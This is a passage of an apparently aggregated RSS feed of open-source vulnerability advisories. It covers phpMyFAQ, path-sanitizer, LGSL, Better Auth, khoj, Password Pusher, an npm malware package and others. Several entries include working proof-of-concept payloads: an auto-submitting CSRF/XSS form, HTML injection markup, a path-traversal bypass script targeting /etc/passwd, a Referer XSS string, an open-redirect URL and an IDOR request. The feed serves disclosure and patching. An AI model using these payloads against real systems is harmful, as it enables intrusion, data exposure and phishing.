      &amp;lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; &#x2F;&amp;gt;
    &amp;lt;&#x2F;form&amp;gt;
    &amp;lt;script&amp;gt;
      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;&#x2F;&#x27;);
      document.forms[0].submit();
    &amp;lt;&#x2F;script&amp;gt;
  &amp;lt;&#x2F;body&amp;gt;
&amp;lt;&#x2F;html&amp;gt;
```

After the user visits the attacker&#x27;s resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client&#x27;s browser.
 
&amp;lt;img width=&quot;389&quot; alt=&quot;fig6&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;e52b68c6-5a98-4db2-85ec-5bf37e4cb625&quot; &#x2F;&amp;gt;

*Figure 6. Executing arbitrary JavaScript code*


# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-ww33-jppq-qfrp: 5.2 | <b>phpMyFAQ Vulnerable to Stored HTML Injection at FAQ</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-ww33-jppq-qfrp</link>
                    <pubDate>2025-01-02T22:43:40Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-ww33-jppq-qfrp'>https://osv.dev/vulnerability/GHSA-ww33-jppq-qfrp</a><br>
                            <b>Published:</b> 2025-01-02T22:43:40Z<br>
                            <b>Severity:</b> 5.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp'>https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-ww33-jppq-qfrp</a></li><li>- <a target='_blank' href='https://github.com/thorsten/phpMyFAQ'>https://github.com/thorsten/phpMyFAQ</a></li></ul><br>
                            <b>Details:</b> <b>phpMyFAQ Vulnerable to Stored HTML Injection at FAQ</b><br>### Summary
Due to insufficient validation on the content of new FAQ posts, it is possible for authenticated users to inject malicious HTML or JavaScript code that can impact other users viewing the FAQ. This vulnerability arises when user-provided inputs in FAQ entries are not sanitized or escaped before being rendered on the page.

### Details
An attacker can inject malicious HTML content into the FAQ editor at http:&#x2F;&#x2F;localhost&#x2F;admin&#x2F;index.php?action=editentry, resulting in a complete disruption of the FAQ page&#x27;s user interface. By injecting malformed HTML elements styled to cover the entire screen, an attacker can render the page unusable. This injection manipulates the page structure by introducing overlapping buttons, images, and iframes, breaking the intended layout and functionality. 

### PoC

1. In the source code of a FAQ Q&amp;A post, insert the likes of this snippet:
```
&amp;lt;p&amp;gt;&amp;lt;--`&amp;lt;img src=&quot;&amp;#96;&quot;&amp;gt; --!&amp;gt;&amp;lt;&#x2F;p&amp;gt;
&amp;lt;div style=&quot;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&quot;&amp;gt;&amp;lt;form&amp;gt;&amp;lt;button&amp;gt;HTML INJECTION 1&amp;lt;img&amp;gt; &amp;lt;img&amp;gt; &amp;lt;img&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt;&amp;lt;&#x2F;iframe&amp;gt;&amp;lt;&#x2F;button&amp;gt;
&amp;lt;div style=&quot;xg-p: absolute; top: 0; left: 0; width: 100%; height: 100%;&quot;&amp;gt;x&amp;lt;&#x2F;div&amp;gt;
&amp;lt;button&amp;gt;HTML INJECTION 2&amp;lt;iframe&amp;gt;&amp;lt;&#x2F;iframe&amp;gt; &amp;lt;iframe&amp;gt;&amp;lt;&#x2F;iframe&amp;gt; &amp;lt;&#x2F;button&amp;gt;&amp;lt;&#x2F;form&amp;gt;&amp;lt;&#x2F;div&amp;gt;
```

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7c12ff40-1978-4dee-b501-c48f3ea2b9ba)
2. A normal user would see the broken FAQ page, or otherwise manipulated by the attacker to present a different malicious page:
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;4b815663-4836-4370-8b02-5b01bce71b0c)
 
A demo (fresh install overwrites every 24hours) here: https:&#x2F;&#x2F;roy.demo.phpmyfaq.de&#x2F;content&#x2F;1&#x2F;24&#x2F;en&#x2F;24.html?

### Impact
Exploiting this issue can lead to Denial of Service for legitimate users, damage to the user experience, and potential abuse in phishing or defacement attacks. 

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-45: 0 | <b>Malicious code in solana-login (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-45</link>
                    <pubDate>2025-01-02T22:30:17Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-45'>https://osv.dev/vulnerability/MAL-2025-45</a><br>
                            <b>Published:</b> 2025-01-02T22:30:17Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://www.sonatype.com/blog/npm-packages-target-solana-devs-drop-keylogging-trojans'>https://www.sonatype.com/blog/npm-packages-target-solana-devs-drop-keylogging-trojans</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in solana-login (npm)</b><br>The package contains several malicious PowerShell and VBS scripts used to harvest browser data, take screenshots, log keystrokes, and establish startup persistence. It also bundles a password stealer and exfiltrates stolen data via Slack and Discord webhooks.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (5bcd2f4310ea9d7c47ddea5d3fadf37070732189221fc37fa21d81fa08779897)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-94p5-r7cc-3rpr: 9.3 | <b>path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability </b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-94p5-r7cc-3rpr</link>
                    <pubDate>2025-01-02T12:52:42Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-94p5-r7cc-3rpr'>https://osv.dev/vulnerability/GHSA-94p5-r7cc-3rpr</a><br>
                            <b>Published:</b> 2025-01-02T12:52:42Z<br>
                            <b>Severity:</b> 9.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr'>https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr</a></li><li>- <a target='_blank' href='https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead'>https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead</a></li><li>- <a target='_blank' href='https://github.com/cabraviva/path-sanitizer'>https://github.com/cabraviva/path-sanitizer</a></li><li>- <a target='_blank' href='https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d'>https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></li></ul><br>
                            <b>Details:</b> <b>path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability </b><br>### Summary
This is a POC for a path-sanitizer [npm package](https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;path-sanitizer). The filters can be bypassed and can result in path traversal.

Payload: `..=%5c` can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. 

### PoC
Here&#x27;s the code to test for the filter bypass:

```js
const sanitize = require(&quot;path-sanitizer&quot;)
const path = require(&quot;path&quot;)
const fs = require(&quot;fs&quot;)

&#x2F;&#x2F; Real scenario:
function routeHandler(myPath) {
  &#x2F;&#x2F; Lets just assume that the path was extracted from the request
  &#x2F;&#x2F; We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  &#x2F;&#x2F; But the user should be able to access C:\Users\user\Desktop\
  &#x2F;&#x2F; So we need to sanitize the path

  const APP_DIR = &quot;&#x2F;var&#x2F;hacker&quot;
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  &#x2F;&#x2F; Now we would usally read the file
  &#x2F;&#x2F; But in this case we just gonna print the path
  &#x2F;&#x2F; console.log(sanitized)
  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) &#x2F;&#x2F; Resolve to absolute path

  fs.readFile(absolutePath, &quot;utf8&quot;, (err, data) =&amp;gt; {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = &quot;..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp&#x2F;hacked.txt&quot;
&#x2F;&#x2F; input_user_bypass = &quot;..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc&#x2F;passwd&quot;
input_user_payload = &quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hacked.txt&quot;

readFile(routeHandler(input_user_bypass))
readFile(routeHandler(input_user_payload))
```

Here is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) 

https:&#x2F;&#x2F;www.loom.com&#x2F;share&#x2F;b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d

### Impact
Any CLI tool or library using this package can be&#x2F;will be vulnerable to Path traversal.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1417: 0 | <b>Heap-buffer-overflow in cv::PngDecoder::read_from_io</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1417</link>
                    <pubDate>2025-01-02T00:15:00.246767Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1417'>https://osv.dev/vulnerability/OSV-2024-1417</a><br>
                            <b>Published:</b> 2025-01-02T00:15:00.246767Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386688710'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386688710</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in cv::PngDecoder::read_from_io</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386688710

```
Crash type: Heap-buffer-overflow READ 4
Crash state:
cv::PngDecoder::read_from_io
cv::PngDecoder::read_chunk
cv::PngDecoder::readHeader
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56517: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56517</link>
                    <pubDate>2024-12-30T17:15:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56517'>https://osv.dev/vulnerability/CVE-2024-56517</a><br>
                            <b>Published:</b> 2024-12-30T17:15:09Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24'>https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24</a></li></ul><br>
                            <b>Details:</b> <b></b><br>LGSL (Live Game Server List) provides online status lists for online video games. Versions up to and including 6.2.1 contain a reflected cross-site scripting vulnerability in the `Referer` HTTP header. The vulnerability allows attackers to inject arbitrary JavaScript code, which is reflected in the HTML response without proper sanitization. When crafted malicious input is provided in the `Referer` header, it is echoed back into an HTML attribute in the application’s response. Commit 7ecb839df9358d21f64cdbff5b2536af25a77de1 contains a patch for the issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-ggwq-xc72-33r3: 5.3 | <b>LGSL has a reflected XSS at &#x2F;lgsl_files&#x2F;lgsl_list.php</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-ggwq-xc72-33r3</link>
                    <pubDate>2024-12-30T16:49:28Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-ggwq-xc72-33r3'>https://osv.dev/vulnerability/GHSA-ggwq-xc72-33r3</a><br>
                            <b>Published:</b> 2024-12-30T16:49:28Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/security/advisories/GHSA-ggwq-xc72-33r3'>https://github.com/tltneon/lgsl/security/advisories/GHSA-ggwq-xc72-33r3</a></li><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/commit/7ecb839df9358d21f64cdbff5b2536af25a77de1'>https://github.com/tltneon/lgsl/commit/7ecb839df9358d21f64cdbff5b2536af25a77de1</a></li><li>- <a target='_blank' href='https://github.com/tltneon/lgsl'>https://github.com/tltneon/lgsl</a></li><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24'>https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24</a></li></ul><br>
                            <b>Details:</b> <b>LGSL has a reflected XSS at &#x2F;lgsl_files&#x2F;lgsl_list.php</b><br># Reflected XSS at &#x2F;lgsl_files&#x2F;lgsl_list.php


**Description:**

Vulnerability: A reflected XSS vulnerability exists in the `Referer` HTTP header of [LGSL v6.2.1](https:&#x2F;&#x2F;github.com&#x2F;tltneon&#x2F;lgsl&#x2F;releases&#x2F;tag&#x2F;v6.2.1). The vulnerability allows attackers to inject arbitrary JavaScript code, which is reflected in the HTML response without proper sanitization.
When crafted malicious input is provided in the `Referer` header, it is echoed back into an HTML attribute in the application’s response.


The vulnerability is present at [Line 20-24](https:&#x2F;&#x2F;github.com&#x2F;tltneon&#x2F;lgsl&#x2F;blob&#x2F;master&#x2F;lgsl_files&#x2F;lgsl_list.php#L20-L24)
```php
  $uri = $_SERVER[&#x27;REQUEST_URI&#x27;];

  if ($lgsl_config[&#x27;preloader&#x27;]) {
    $uri = $_SERVER[&#x27;HTTP_REFERER&#x27;];
  }
```

**Proof of Concept:**
1. Capture a request to the path `&#x2F;lgsl_files&#x2F;lgsl_list.php`.
2. Inject the following payload into the Referer header: `test&#x27;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;&amp;lt;`.
3. Send the request.
4. The XSS payload is triggered when reloading.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;467a6c60-db45-4520-9918-59dff819b384)
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c537c59e-38c2-47f0-97d8-54ee1b2018b8)



**Impact:**

Execution of Malicious Code


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8jhw-6pjj-8723: 7.9 | <b>Better Auth has an Open Redirect Vulnerability in Verify Email Endpoint</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8jhw-6pjj-8723</link>
                    <pubDate>2024-12-30T16:49:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8jhw-6pjj-8723'>https://osv.dev/vulnerability/GHSA-8jhw-6pjj-8723</a><br>
                            <b>Published:</b> 2024-12-30T16:49:12Z<br>
                            <b>Severity:</b> 7.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723'>https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723</a></li><li>- <a target='_blank' href='https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f'>https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f</a></li><li>- <a target='_blank' href='https://github.com/better-auth/better-auth'>https://github.com/better-auth/better-auth</a></li></ul><br>
                            <b>Details:</b> <b>Better Auth has an Open Redirect Vulnerability in Verify Email Endpoint</b><br>## Summary
An **open redirect vulnerability** has been identified in the **verify email endpoint** of Better Auth, potentially allowing attackers to redirect users to malicious websites. This issue affects users relying on email verification links generated by the library.

## Affected Versions
- All versions prior to **v1.1.6**.

## Impact
Attackers could craft malicious email verification links that exploit the redirect functionality to send users to untrusted domains. This can result in:

- **Phishing attacks** – Users may unknowingly enter sensitive information on fake login pages.
- **Reputation damage** – Trust issues for applications using Better Auth.

## Vulnerability Details
The verify email callback endpoint accepts a `callbackURL` parameter. Unlike other verification methods, email verification only uses JWT to verify and redirect without proper validation of the target domain. The origin checker is bypassed in this scenario because it only checks for `POST` requests. An attacker can manipulate this parameter to redirect users to arbitrary URLs controlled by the attacker.

**Example Exploit:**
```
https:&#x2F;&#x2F;example.com&#x2F;auth&#x2F;verify-email?token=abcd1234&amp;callbackURL=https:&#x2F;&#x2F;malicious-site.com
```

## Patches
Upgrade to Better Auth **v1.1.6** or later. This version enforces domain validation for `callbackURL` for `&#x2F;verify-email` path and for all other `GET` endpoints.

## Workarounds
You can also use hooks to pre-check URLs in your auth instance to prevent this without upgrading:

```ts
const auth = betterAuth({
    hooks: {
         before: (ctx) =&amp;gt; {
            if (ctx.path === &quot;&#x2F;verify-email&quot;) {
               const callbackURL = ctx.query.callbackURL; &#x2F;&#x2F; Check if this is a trusted callback URL or not
            }
         }
    }
})
```
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4fwj-m62q-pp47: 5.7 | <b>Password Pusher Allows Session Token Interception Leading to Potential Hijacking</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4fwj-m62q-pp47</link>
                    <pubDate>2024-12-30T16:46:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4fwj-m62q-pp47'>https://osv.dev/vulnerability/GHSA-4fwj-m62q-pp47</a><br>
                            <b>Published:</b> 2024-12-30T16:46:43Z<br>
                            <b>Severity:</b> 5.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-4fwj-m62q-pp47'>https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-4fwj-m62q-pp47</a></li><li>- <a target='_blank' href='https://github.com/pglombardo/PasswordPusher'>https://github.com/pglombardo/PasswordPusher</a></li><li>- <a target='_blank' href='https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pwpush/CVE-2024-56733.yml'>https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pwpush/CVE-2024-56733.yml</a></li></ul><br>
                            <b>Details:</b> <b>Password Pusher Allows Session Token Interception Leading to Potential Hijacking</b><br>### Impact

A vulnerability has been reported in Password Pusher where an attacker can copy the session cookie before a user logs out, potentially allowing session hijacking.

Although the session token is replaced and invalidated upon logout, if an attacker manages to capture the session cookie before this process, they can use the token to gain unauthorized access to the user&#x27;s session until the token expires or is manually cleared.

This vulnerability hinges on the attacker&#x27;s ability to access the session cookie during an active session, either through a man-in-the-middle attack, by exploiting another vulnerability like XSS, or via direct access to the victim&#x27;s device.

### Patches

Although there is no direct resolution to this vulnerability, it is recommended to always use the latest version of Password Pusher to best mitigate risk.

### Workarounds

If self-hosting, ensure Password Pusher is hosted exclusively over SSL connections to encrypt traffic and prevent session cookies from being intercepted in transit. Additionally, implement best practices in local security to safeguard user systems, browsers, and data against unauthorized access.

To further mitigate session hijacking risks, Password Pusher implements the following security measures:

1. **Automatic Session Expiration**: Sessions are automatically expired after 2 hours of inactivity, reducing the window for potential exploitation.
2. **Session Reset on Login and Logout**: Sessions are fully reset both when a user logs in and logs out, ensuring that session tokens are not reusable post-logout. This practice invalidates old session tokens and issues new ones, minimizing the risk of session hijacking.
3. **Encrypted Cookies**: Cookies are encrypted using the value of SECRET_KEY_BASE from the application&#x27;s configuration. This encryption adds a layer of protection against tampering or reading the session cookie&#x27;s contents if intercepted, although it doesn&#x27;t prevent the cookie from being used if stolen.

**Note**: While these measures significantly enhance security, they are part of a broader security strategy.

### References

* https:&#x2F;&#x2F;edgeguides.rubyonrails.org&#x2F;security.html#session-hijacking

### Credits

Thank you to [Positive Technologies](https:&#x2F;&#x2F;www.ptsecurity.com&#x2F;ww-en&#x2F;) for reporting and working with me to bring this CVE to the community.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hq4h-w933-jm6c: 4.3 | <b>khoj has an IDOR in subscription management allows unauthorized subscription modifications</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hq4h-w933-jm6c</link>
                    <pubDate>2024-12-30T16:12:40Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hq4h-w933-jm6c'>https://osv.dev/vulnerability/GHSA-hq4h-w933-jm6c</a><br>
                            <b>Published:</b> 2024-12-30T16:12:40Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/khoj-ai/khoj/security/advisories/GHSA-hq4h-w933-jm6c'>https://github.com/khoj-ai/khoj/security/advisories/GHSA-hq4h-w933-jm6c</a></li><li>- <a target='_blank' href='https://github.com/khoj-ai/khoj/commit/47d3c8c23597900af708bdc60aced3ae5d2064c1'>https://github.com/khoj-ai/khoj/commit/47d3c8c23597900af708bdc60aced3ae5d2064c1</a></li><li>- <a target='_blank' href='https://github.com/khoj-ai/khoj'>https://github.com/khoj-ai/khoj</a></li></ul><br>
                            <b>Details:</b> <b>khoj has an IDOR in subscription management allows unauthorized subscription modifications</b><br>### Summary
An Insecure Direct Object Reference (IDOR) vulnerability in the update_subscription endpoint allows any authenticated user to manipulate other users&#x27; Stripe subscriptions by simply modifying the email parameter in the request.

### Details
The vulnerability exists in the subscription endpoint at `&#x2F;api&#x2F;subscription`. The endpoint uses an email parameter as a direct reference to user subscriptions without verifying object ownership. While authentication is required, there is no authorization check to verify if the authenticated user owns the referenced subscription.

Vulnerable code in `&#x2F;api&#x2F;subscription`:
```python
@subscription_router.patch(&quot;&quot;)
@requires([&quot;authenticated&quot;])
async def update_subscription(request: Request, email: str, operation: str):
    # IDOR: email parameter directly references user subscriptions without ownership verification
    customers = stripe.Customer.list(email=email).auto_paging_iter()
    customer = next(customers, None)
    
    if operation == &quot;cancel&quot;:
        # Any authenticated user can modify any subscription referenced by email
        customer_id = customer.id
        for subscription in stripe.Subscription.list(customer=customer_id):
            stripe.Subscription.modify(subscription.id, cancel_at_period_end=True)
```

### PoC
1. Create a customer account in stripe:
   - Customer A: `adventure8812@zeropath.com` (attacker)

2. Log in as any user.

3. Send this request:
```http
PATCH &#x2F;api&#x2F;subscription?email=adventure8812@zeropath.com&amp;operation=cancel HTTP&#x2F;1.1
```

4. The subscription for Customer A is successfully set to cancel.

### Impact
High:
Revenue loss via mass cancellation of subscriptions.
Loss of customer trust by re-enabling subscriptions they had set to cancel.

### Resolution

This was fixed in the following commit which limited subscription update operations to the authenticated user: https:&#x2F;&#x2F;github.com&#x2F;khoj-ai&#x2F;khoj&#x2F;commit&#x2F;47d3c8c23597900af708bdc60aced3ae5d2064c1. Support for arbitrarily presenting an email for update has been deprecated.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1411: 0 | <b>Use-of-uninitialized-value in mark_context</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1411</link>
                    <pubDate>2024-12-29T00:03:28.881713Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1411'>https://osv.dev/vulnerability/OSV-2024-1411</a><br>
                            <b>Published:</b> 2024-12-29T00:03:28.881713Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386128938'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386128938</a></li></ul><br>
                            <b>Details:</b> <b>Use-of-uninitialized-value in mark_context</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386128938

```
Crash type: Use-of-uninitialized-value
Crash state:
mark_context
incremental_gc
mrb_incremental_gc
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-37x3-j9jq-vrjx: 4.8 | <b>Dcat-Admin Cross-Site Scripting (XSS) vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-37x3-j9jq-vrjx</link>
                    <pubDate>2024-12-28T00:30:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-37x3-j9jq-vrjx'>https://osv.dev/vulnerability/GHSA-37x3-j9jq-vrjx</a><br>
                            <b>Published:</b> 2024-12-28T00:30:43Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/taynes-llllzt/taynes/issues/5'>https://github.com/taynes-llllzt/taynes/issues/5</a></li><li>- <a target='_blank' href='https://github.com/jqhph/dcat-admin'>https://github.com/jqhph/dcat-admin</a></li></ul><br>
                            <b>Details:</b> <b>Dcat-Admin Cross-Site Scripting (XSS) vulnerability</b><br>Dcat-Admin v2.2.0-beta and v2.2.2-beta contains a Cross-Site Scripting (XSS) vulnerability via &#x2F;admin&#x2F;auth&#x2F;menu and &#x2F;admin&#x2F;auth&#x2F;extensions.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9q34-7hfr-h8jm: 4.8 | <b>Dcat Admin Cross-site Scripting (XSS) vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9q34-7hfr-h8jm</link>
                    <pubDate>2024-12-28T00:30:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9q34-7hfr-h8jm'>https://osv.dev/vulnerability/GHSA-9q34-7hfr-h8jm</a><br>
                            <b>Published:</b> 2024-12-28T00:30:43Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/taynes-llllzt/taynes/issues/4'>https://github.com/taynes-llllzt/taynes/issues/4</a></li><li>- <a target='_blank' href='https://github.com/jqhph/dcat-admin'>https://github.com/jqhph/dcat-admin</a></li></ul><br>
                            <b>Details:</b> <b>Dcat Admin Cross-site Scripting (XSS) vulnerability</b><br>Dcat Admin v2.2.0-beta contains a cross-site scripting (XSS) vulnerability in &#x2F;admin&#x2F;articles&#x2F;create.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7p2g-2vxc-5g55: 7.5 | <b>Letta (previously MemGPT) incorrect access control vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7p2g-2vxc-5g55</link>
                    <pubDate>2024-12-27T21:30:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7p2g-2vxc-5g55'>https://osv.dev/vulnerability/GHSA-7p2g-2vxc-5g55</a><br>
                            <b>Published:</b> 2024-12-27T21:30:30Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/letta-ai/letta'>https://github.com/letta-ai/letta</a></li><li>- <a target='_blank' href='https://github.com/letta-ai/letta/blob/0.3.17/memgpt/server/rest_api/admin/users.py#L55-L68'>https://github.com/letta-ai/letta/blob/0.3.17/memgpt/server/rest_api/admin/users.py#L55-L68</a></li><li>- <a target='_blank' href='https://github.com/letta-ai/letta/releases/tag/0.3.17'>https://github.com/letta-ai/letta/releases/tag/0.3.17</a></li><li>- <a target='_blank' href='https://medium.com/@cnetsec/a-vulnerability-cve-2024-39025-has-been-identified-in-lettaai-memgpt-v0-3-17-146cb38bb6db'>https://medium.com/@cnetsec/a-vulnerability-cve-2024-39025-has-been-identified-in-lettaai-memgpt-v0-3-17-146cb38bb6db</a></li></ul><br>
                            <b>Details:</b> <b>Letta (previously MemGPT) incorrect access control vulnerability</b><br>Incorrect access control in the &#x2F;users endpoint of Cpacker MemGPT v0.3.17 allows attackers to access sensitive data.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j5vv-6wjg-cfr8: 8.6 | <b>changedetection.io Vulnerable to Improper Input Validation Leading to LFR&#x2F;Path Traversal</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j5vv-6wjg-cfr8</link>
                    <pubDate>2024-12-27T18:02:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j5vv-6wjg-cfr8'>https://osv.dev/vulnerability/GHSA-j5vv-6wjg-cfr8</a><br>
                            <b>Published:</b> 2024-12-27T18:02:02Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> <br>
